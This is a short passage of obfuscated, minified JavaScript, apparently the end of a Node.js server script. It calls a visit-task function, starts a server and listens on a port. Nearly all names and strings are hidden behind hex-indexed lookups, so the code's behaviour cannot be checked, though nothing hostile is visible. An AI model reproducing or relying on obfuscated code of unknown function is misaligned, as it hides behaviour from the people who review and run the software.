AddVisitTask();}catch(_0x5c8a88){console[_0x28632f(0x141)](_0x28632f(0x1c7),_0x5c8a88);}}startserver()[_0x2d953b(0x1b5)](_0x4dc4cd=>{const _0x42f621=_0x2d953b;console['error'](_0x42f621(0x130),_0x4dc4cd);}),app[_0x2d953b(0x15e)](PORT,()=>console['log'](_0x2d953b(0x183)+PORT+'!'));
